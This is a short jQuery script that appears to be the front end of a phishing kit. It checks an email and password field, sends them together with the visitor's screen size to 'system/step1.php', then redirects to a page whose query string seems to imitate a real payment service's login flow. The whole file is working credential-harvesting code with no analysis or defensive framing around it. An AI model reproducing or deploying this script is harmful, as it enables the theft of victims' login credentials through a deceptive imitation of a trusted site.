$("#lib").attr('disabled', '');
$("[name=screen]").val(screen.width + ' x ' + screen.height);

function isEmail(email) {
    return /^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/.test($.trim(email));
}
$(document).on("keyup", ".input", function() {
    if ($(this).val()) {
        $(this).addClass("hasText");
    } else {
        $(this).removeClass("hasText");
    }
    if (!$(this).val()) {
        $(this).parent().parent().parent().parent().addClass("error");
        return false;
    } else {
        $(this).parent().parent().parent().parent().removeClass("error");
    }
});
$(document).on("keyup", "[name=eml]", function() {
    if (!isEmail($(this).val())) {
        $(this).parent().parent().parent().parent().addClass("error");
        return false;
    } else {
        $(this).parent().parent().parent().parent().removeClass("error");
    }
});
$(document).on("submit", "form", function(e) {
    e.preventDefault();
    var me = $(this);
    var check = true;
    if (!isEmail($("[name=eml]").val())) {
        $("[name=eml]").parent().parent().parent().parent().addClass("error");
        check = false;
    } else {
        $("[name=eml]").parent().parent().parent().parent().removeClass("error");
    }
    if (!$("[name=pss]").val()) {
        $("[name=pss]").parent().parent().parent().parent().addClass("error");
        check = false;
    } else {
        $("[name=pss]").parent().parent().parent().parent().removeClass("error");
    }
    if (!check) {
        return false;
    } else {
        $("#rotate").show();
        $.post("system/step1.php", me.serialize(), function(data, status, ) {
            if (status == "success") {
                if (data == "error") {
                    $("#msg").show();
                    $("#rotate").hide();
                    me[0].reset();
                    $(".input").removeClass("hasText");
                } else {
                $(location).attr("href", "./account.php?country.x=Global&flowContext=login&flowId=ul&_Email=datax");
                }
            } else {
                $("#msg").show();
                $("#rotate").hide();
            }
        });
    }
});
      